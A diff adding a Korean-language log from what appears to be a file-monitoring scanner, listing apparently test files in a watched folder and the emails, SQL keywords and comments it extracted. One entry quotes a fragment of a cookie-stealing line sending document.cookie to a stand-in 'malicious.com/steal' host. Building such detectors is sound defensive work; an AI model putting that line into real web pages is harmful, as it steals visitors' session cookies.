@@ -1,0 +1,28 @@
+[2025-06-16 02:40:30] 감지된 파일: summary.md
+ - 파일 경로: ./monitor_directory\summary.md
+ - 파일 크기: 131 bytes
+ - 민감 정보 [주석]: ['# 보고서 요약']
+
+[2025-06-16 02:40:44] 감지된 파일: Exploit.class
+ - 파일 경로: ./monitor_directory\Exploit.class
+ - 파일 크기: 255 bytes
+ - 의심 확장자 감지됨
+ - 민감 정보 [이메일]: ['exploit@mal.net']
+ - 민감 정보 [SQL문]: ['DELETE']
+ - 민감 정보 [주석]: ['/*\nMulti-line comment with email: exploit@mal.net\n*/']
+
+[2025-06-16 02:40:44] 감지된 파일: injector.js
+ - 파일 경로: ./monitor_directory\injector.js
+ - 파일 크기: 154 bytes
+ - 의심 확장자 감지됨
+ - 민감 정보 [이메일]: ['attacker@evil.com']
+ - 민감 정보 [주석]: ['// Email: attacker@evil.com', '//malicious.com/steal?cookie=" + document.cookie);']
+
+[2025-06-16 02:40:44] 감지된 파일: test_malicious.py
+ - 파일 경로: ./monitor_directory\test_malicious.py
+ - 파일 크기: 164 bytes
+ - 의심 확장자 감지됨
+ - 민감 정보 [이메일]: ['hacker@example.com']
+ - 민감 정보 [SQL문]: ['SELECT']
+ - 민감 정보 [주석]: ['# 공격자 이메일', '# hacker@example.com']
+
